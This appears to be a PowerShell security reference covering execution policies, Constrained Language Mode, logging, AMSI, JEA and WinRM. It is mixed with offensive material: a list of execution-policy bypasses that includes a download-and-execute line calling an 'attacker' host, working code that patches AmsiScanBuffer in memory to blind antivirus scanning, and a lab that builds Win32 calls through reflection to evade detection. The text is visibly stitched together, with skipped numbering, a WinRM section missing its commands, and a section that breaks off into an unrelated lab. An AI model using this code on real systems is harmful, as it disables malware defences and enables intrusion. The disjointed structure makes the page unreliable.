Execution Policies

Execution policies are NOT a security boundary. They are a safety feature to prevent accidental script execution. They can be trivially bypassed by any user with shell access.

Policy Levels

PolicyBehavior
RestrictedDefault on Windows clients. No scripts run. Interactive commands only.
AllSignedAll scripts (.ps1, .psm1, .psd1) must have a trusted digital signature. Prompts for untrusted publishers.
RemoteSignedDefault on Windows servers. Downloaded scripts require signature; local scripts run without signature.
UnrestrictedAll scripts run. Warns before running downloaded scripts (Zone.Identifier ADS check).
BypassNothing is blocked, no warnings or prompts. Designed for programmatic use.
UndefinedNo policy set at current scope. If all scopes are Undefined, effective policy is Restricted.

Policy Scopes (Precedence Order)

ScopeConfigured ViaPrecedence
MachinePolicyGPO (Computer Configuration)Highest
UserPolicyGPO (User Configuration)2nd
ProcessEnvironment variable / -ExecutionPolicy flag3rd
CurrentUserHKCU registry4th
LocalMachineHKLM registryLowest
 
# View all scopes and their policies
Get-ExecutionPolicy -List

# View effective policy
Get-ExecutionPolicy

# Set policy for current user
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned

Bypass Techniques

Since execution policy is not a security boundary, numerous bypass methods exist:

# 1. Direct flag bypass
powershell.exe -ExecutionPolicy Bypass -File script.ps1

# 2. Pipe to PowerShell (no file written — bypasses RemoteSigned)
Get-Content script.ps1 | powershell.exe -NoProfile -

# 3. Read and execute via IEX
IEX (Get-Content script.ps1 -Raw)

# 4. Download and execute in memory (never touches disk)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')

# 5. Encoded command (Base64 UTF-16LE)
$cmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Host "bypassed"'))
powershell.exe -EncodedCommand $cmd

# 6. Alternate shell — pwsh (PowerShell 7) has separate policy
pwsh.exe -ExecutionPolicy Bypass -File script.ps1

# 7. Invoke through .NET directly
[System.Management.Automation.PowerShell]::Create().AddScript('Write-Host "bypassed"').Invoke()

# 8. Using Command switch (not a file, so no policy check)
powershell.exe -Command "& { . .\script.ps1 }"

# 9. Paste script directly into console (interactive — no policy)
# 10. Use Invoke-Expression on string variable
$code = Get-Content .\script.ps1 -Raw; Invoke-Expression $code

# 11. Set via environment variable for child process
$env:PSExecutionPolicyPreference = "Bypass"

# 12. Use alternate hosts (ISE, custom host) — each has own policy
powershell_ise.exe  # May have different policy
Key Takeaway: If GPO sets MachinePolicy, you cannot override it with Set-ExecutionPolicy. However, the -ExecutionPolicy flag on powershell.exe sets the Process scope which still loses to MachinePolicy. In that case, use piping, encoding, or .NET invocation methods that don't trigger the policy check.

Constrained Language Mode (CLM)

CLM is a real security control (unlike execution policy). It restricts the PowerShell language to a safe subset, blocking dangerous operations while allowing basic scripting.

What CLM Restricts

CategoryRestriction
.NET TypesOnly allowed types from a curated list. Blocks arbitrary [System.Runtime.InteropServices.Marshal], [System.Reflection.Assembly], etc.
COM ObjectsAll COM object creation blocked (New-Object -ComObject)
Win32 APIAdd-Type with C#/VB using DllImport blocked entirely
Add-TypeCannot compile arbitrary C#/VB/JScript code
Type AcceleratorsCustom type accelerators not available
Script Blocks as DelegatesCannot convert script blocks to .NET delegates
Dot-sourcing untrustedCan only dot-source scripts that pass policy
DSC ResourcesClass-based DSC resources blocked

Allowed in CLM

  • Core cmdlets (Get-Process, Get-Service, etc.)
  • Basic .NET types (strings, integers, arrays, hashtables)
  • Comparison/arithmetic operators
  • If/else, foreach, while, switch statements
  • Functions (without .NET type access)
  • Allowed types: [string], [int], [bool], [array], [hashtable], [psobject], [datetime], [timespan], [guid], [regex], [math]

How CLM is Enforced

CLM is triggered by application control policies:

  • AppLocker — When a script rule policy exists (even Allow *), PowerShell enters CLM for unsigned/untrusted scripts
  • WDAC (Windows Defender Application Control) — More robust. Scripts not in the policy get CLM. Preferred over AppLocker.
  • System lockdown via __PSLockdownPolicy — Environment variable (legacy). If set to 4, forces CLM. Trivially bypassed by unsetting the variable (only in non-WDAC scenarios).

PowerShell Logging

PowerShell has three major logging mechanisms. All three should be enabled for proper security monitoring.

Script Block Logging (Event ID 4104)

Captures the deobfuscated script block text at execution time. This is the single most valuable PowerShell log — it shows what actually runs regardless of encoding/obfuscation layers.

# Enable Script Block Logging via registry
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1

# Enable invocation logging (also logs start/stop — verbose)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockInvocationLogging" -Value 1

# Query script block logs
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} |
  Select-Object TimeCreated, @{N='ScriptBlock';E={$_.Properties[2].Value}} | Format-List

# Search for suspicious content in logs
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} |
  Where-Object { $_.Message -match 'AmsiUtils|Invoke-Mimikatz|DownloadString|IEX|bypass' }

AMSI (Antimalware Scan Interface)

AMSI is a Windows API that allows applications to integrate with installed antimalware products. It provides a content-scanning interface that sits between script execution and the AV engine.

Architecture

amsi.dll is loaded into every process that opts in:

  • PowerShell (System.Management.Automation.dll loads AMSI)
  • VBScript / JScript (wscript.exe, cscript.exe)
  • .NET CLR (4.8+ loads amsi.dll for Assembly.Load)
  • Office VBA Macros
  • Windows Script Host
  • Any application calling AMSI APIs

AMSI Call Flow

# Pseudocode of AMSI flow in PowerShell:
# 1. AmsiInitialize(appName, &amsiContext)     — creates context for "PowerShell_*.exe"
# 2. AmsiOpenSession(amsiContext, &session)     — per-pipeline/script session
# 3. AmsiScanBuffer(amsiContext, buffer, len, contentName, session, &result) — THE scan
# 4. If result == AMSI_RESULT_DETECTED → block execution, throw error
# 5. AmsiCloseSession(amsiContext, session)     — cleanup
# 6. AmsiUninitialize(amsiContext)              — process exit

PowerShell Integration Detail

In PowerShell, AMSI scans occur at the script block level:

  1. User enters command or script executes
  2. PowerShell compiles script block (deobfuscates/expands)
  3. Before execution, the deobfuscated text is sent to AmsiScanBuffer
  4. Defender (or registered provider) evaluates the content
  5. If malicious → This script contains malicious content and has been blocked

Provider Registration

# AMSI providers register via COM under:
# HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{GUID}
# Windows Defender's GUID: {2781761E-28E0-4109-99FE-B9D127C57AFE}

# List registered AMSI providers
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\AMSI\Providers"

# Each provider implements IAntimalwareProvider COM interface:
# - Scan(IAmsiStream stream, out AMSI_RESULT result)
# - CloseSession(ULONGLONG session)
# - DisplayName { get; }

AMSI Bypass Techniques

Warning: These techniques are documented for defensive understanding and CTF contexts. Use responsibly.

1. Memory Patching AmsiScanBuffer

Overwrite the first bytes of AmsiScanBuffer with instructions that return AMSI_RESULT_CLEAN (0).

# Classic AmsiScanBuffer patch — overwrites function prologue with:
# mov eax, 0x80070057 (E_INVALIDARG) → ret
# This makes every scan return "clean"

$win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $win32
$amsiDll = [Win32]::LoadLibrary("amsi.dll")
$amsiScanBuffer = [Win32]::GetProcAddress($amsiDll, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($amsiScanBuffer, [uint32]5, 0x40, [ref]$p)
$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)  # mov eax, 0x80070057; ret
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $amsiScanBuffer, 6)

7. CLR Hooking

// Hook AmsiScanBuffer at the CLR level using a managed hook
// This requires injecting into the process or running as a custom host
using System;
using System.Runtime.InteropServices;

public class AmsiBypass {
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32")]
    static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, 
        uint flNewProtect, out uint lpflOldProtect);

    public static void Patch() {
        IntPtr amsi = GetModuleHandle("amsi.dll");
        IntPtr asb = GetProcAddress(amsi, "AmsiScanBuffer");
        uint oldProtect;
        VirtualProtect(asb, (UIntPtr)8, 0x40, out oldProtect);
        // xor rax, rax; ret (return 0 = AMSI_RESULT_CLEAN)
        Marshal.Copy(new byte[] { 0x48, 0x31, 0xC0, 0xC3 }, 0, asb, 4);
        VirtualProtect(asb, (UIntPtr)8, oldProtect, out oldProtect);
    }
}

JEA (Just Enough Administration)

JEA creates constrained PowerShell remoting endpoints that limit what connected users can do. It operates on a least-privilege model using role capabilities.

Session Configuration File (.pssc)

# Create session configuration
New-PSSessionConfigurationFile -Path .\JEAConfig.pssc -SessionType RestrictedRemoteServer `
  -RunAsVirtualAccount `
  -TranscriptDirectory "C:\ProgramData\JEA\Transcripts" `
  -RoleDefinitions @{
    'DOMAIN\HelpDesk' = @{ RoleCapabilities = 'HelpDeskOps' }
    'DOMAIN\ServerAdmins' = @{ RoleCapabilities = 'ServerMaintenance' }
  }

# Key .pssc properties:
# SessionType: RestrictedRemoteServer (locked down) or Default  
# RunAsVirtualAccount: $true — commands run as a temporary local admin
# RunAsVirtualAccountGroups: limit groups the virtual account belongs to
# TranscriptDirectory: mandatory logging location
# LanguageMode: defaults to NoLanguage for JEA (only visible commands work)
# MountUserDrive: $true — gives user a PSDrive for file transfer

Role Capability File (.psrc)

# Create role capability
New-PSRoleCapabilityFile -Path "C:\Program Files\WindowsPowerShell\Modules\JEARoles\RoleCapabilities\HelpDeskOps.psrc" `
  -VisibleCmdlets @(
    'Restart-Computer',
    'Get-Service',
    @{ Name = 'Restart-Service'; Parameters = @{ Name = 'Name'; ValidateSet = 'Spooler','W32Time' } },
    'Get-Process'
  ) `
  -VisibleExternalCommands @('C:\Windows\System32\ipconfig.exe', 'C:\Windows\System32\whoami.exe') `
  -VisibleFunctions @('Get-ServerInfo') `
  -FunctionDefinitions @{
    Name = 'Get-ServerInfo'
    ScriptBlock = { Get-ComputerInfo | Select-Object CsName, OsName, OsVersion }
  }

# Key .psrc properties:
# VisibleCmdlets: whitelist with optional parameter constraints
# VisibleFunctions: custom functions available in session
# VisibleExternalCommands: allowed .exe paths
# VisibleAliases: allowed aliases
# VisibleProviders: allowed PS providers (FileSystem, Registry, etc.)
# ScriptsToProcess: scripts that run when session starts
# FunctionDefinitions: inline function implementations

Registering JEA Endpoint

# Register the session configuration
Register-PSSessionConfiguration -Name 'HelpDeskEndpoint' -Path .\JEAConfig.pssc -Force

# Connect to JEA endpoint
Enter-PSSession -ComputerName Server01 -ConfigurationName HelpDeskEndpoint

# Or invoke commands
Invoke-Command -ComputerName Server01 -ConfigurationName HelpDeskEndpoint -ScriptBlock {
    Get-Service | Where-Object Status -eq 'Running'
}

# List available commands in JEA session
Get-Command  # Only shows visible cmdlets/functions

PowerShell Remoting / WinRM

PowerShell remoting uses WS-Management protocol over HTTP (5985) or HTTPS (5986) via the WinRM service.

Configuration

# This does:

# 2. Creates HTTP listener on port 5985
# 3. Creates firewall exception
# 4. Registers default session configurations

winrm enumerate winrm/config/listener

# Configure HTTPS listener (requires certificate)

New-Item -Path WSMan:\localhost\Listener -Transport HTTPS -Address * -CertificateThumbPrint $cert.Thumbprint

# Trusted hosts (for non-domain environments)
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "192.168.1.*"

# Test connectivity
Test-WSMan -ComputerName Server01
Test-WSMan -ComputerName Server01 -Authentication Default -Credential (Get-Credential)

Session Types

# Interactive session (1:1)
Enter-PSSession -ComputerName Server01 -Credential $cred
# You get a prompt: [Server01]: PS C:\>
Exit-PSSession

# Fan-out command execution (1:many, parallel)
Invoke-Command -ComputerName Server01,Server02,Server03 -ScriptBlock {
    Get-Process | Sort-Object CPU -Descending | Select-Object -First 5
} -Credential $cred

# Persistent sessions (reusable, maintains state)
$sessions = New-PSSession -ComputerName Server01,Server02 -Credential $cred
Invoke-Command -Session $sessions -ScriptBlock { $global:x = 42 }
Invoke-Command -Session $sessions -ScriptBlock { $global:x }  # Returns 42
Remove-PSSession $sessions

# Disconnected sessions (survive network drops)
$s = New-PSSession -ComputerName Server01 -Name "LongRunning"
Invoke-Command -Session $s -ScriptBlock { Start-Sleep 3600; Get-EventLog -LogName System -Newest 100 } -AsJob
Disconnect-PSSession $s
# Later, from any machine:
$s = Get-PSSession -ComputerName Server01 -Name "LongRunning"
Connect-PSSession $s
Receive-PSSession $s

The Double-Hop Problem

When you remote to Server A and try to access Server B from that session, your credentials don't follow. This is because Kerberos doesn't delegate by default.

# Problem: This fails from a remoting session
Invoke-Command -ComputerName ServerA -ScriptBlock {
    # From ServerA, trying to reach ServerB — NO credentials available
    Get-Content \\ServerB\Share\file.txt  # ACCESS DENIED
}

Objective: Use .NET reflection to call Windows APIs directly from PowerShell without Add-Type.

# Step 1: Understand the goal — call Win32 APIs without Add-Type
# Add-Type compiles to disk and is easily detected. Dynamic P/Invoke avoids this.

# Step 2: Find GetModuleHandle and GetProcAddress via reflection
$systemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | 
  Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq 'System.dll' }
$unsafeNativeMethods = $systemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')

# Get method references
$getModuleHandle = $unsafeNativeMethods.GetMethod('GetModuleHandle')
$getProcAddress = $unsafeNativeMethods.GetMethod('GetProcAddress', 
  [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))

# Step 3: Resolve kernel32 function addresses
$kernel32 = $getModuleHandle.Invoke($null, @("kernel32.dll"))
$kernel32Ref = New-Object System.Runtime.InteropServices.HandleRef([IntPtr]::Zero, $kernel32)

# Get VirtualAlloc address
$virtualAllocAddr = $getProcAddress.Invoke($null, @($kernel32Ref, "VirtualAlloc"))
Write-Host "VirtualAlloc @ $virtualAllocAddr"

# Get VirtualProtect address
$virtualProtectAddr = $getProcAddress.Invoke($null, @($kernel32Ref, "VirtualProtect"))
Write-Host "VirtualProtect @ $virtualProtectAddr"

# Step 4: Create delegate types dynamically
function New-DelegateType {
    param([Type[]]$Parameters, [Type]$ReturnType = [Void])
    
    $domain = [AppDomain]::CurrentDomain
    $dynAssembly = New-Object Reflection.AssemblyName('ReflectedDelegates')
    $assemblyBuilder = $domain.DefineDynamicAssembly($dynAssembly, 'Run')
    $moduleBuilder = $assemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $typeBuilder = $moduleBuilder.DefineType('DelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [MulticastDelegate])
    
    $ctorBuilder = $typeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', 'Standard', @([IntPtr], [IntPtr]))
    $ctorBuilder.SetImplementationFlags('Runtime, Managed')
    
    $methodBuilder = $typeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $methodBuilder.SetImplementationFlags('Runtime, Managed')
    
    $typeBuilder.CreateType()
}

# Step 5: Create VirtualAlloc delegate
$virtualAllocDelegate = New-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
$virtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($virtualAllocAddr, $virtualAllocDelegate)
